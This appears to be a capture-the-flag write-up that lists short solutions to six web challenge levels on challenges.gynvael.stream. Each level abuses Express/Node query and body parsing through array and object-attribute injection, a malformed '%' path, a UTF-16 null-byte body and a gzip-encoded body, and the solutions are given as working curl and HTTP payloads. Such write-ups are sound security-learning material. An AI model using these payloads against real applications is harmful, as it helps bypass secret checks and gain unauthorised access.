# Info
* https://twitter.com/gynvael?lang=en
* http://challenges.gynvael.stream:5001-10

# Level 1

Solution: Make the `secret` param an array

```
http://challenges.gynvael.stream:5001/?secret[]=GIVEmeTHEflagNOW
```

# Level 2

Solution: Hijack attributes of query parameter
```
curl 'http://challenges.gynvael.stream:5002/?X\[length\]=801&X\[toString\]=1
```

# Level 3
(In this chal the flag was in the file path)
Solution: Force express to throw an error by using `%` as the param

```
http://challenges.gynvael.stream:5003/%
```

# Level 4

Solution: Encode the required keyword in `utf-16` encoding (Each letter takes 2 bytes in this case). Start each letter with a null value (%00). The way i did this was by editing my request in Burp (hex view) to insert null bytes. Also be sure to set the correct content-type!

```
POST /flag HTTP/1.1
Host: pwnd.top:5004
Content-type: text/plain;charset=utf-16
Content-Length: 26

\0S\0h\0o\0w\0M\0e\0T\0h\0e\0F\0l\0a\0g # Each \0 is set in the HEX view of repeater tab
```

# Level 5

Solution: Similiar to level 4 but a bit harder. Have to abuse the fact that querystring (body-parser urlencoded(extended:false)) will auto un-gzip a payload. This is tricky if using Burp as there's no easy way to send a gzipped payload. This is one of Burp's biggest downfalls.

```
echo -n 'secret=ShowMeTheFlag' | gzip|curl challenges.gynvael.stream:5005/flag -H 'Content-Encoding: gzip' --data-binary @-

```

# Level 6

Solution: (this chal may be broken?) - just send '<undefined>' as secret2

```
curl 'http://challenges.gynvael.stream:5006/flag?secret1=pwndt&secret2=<undefined>'
```
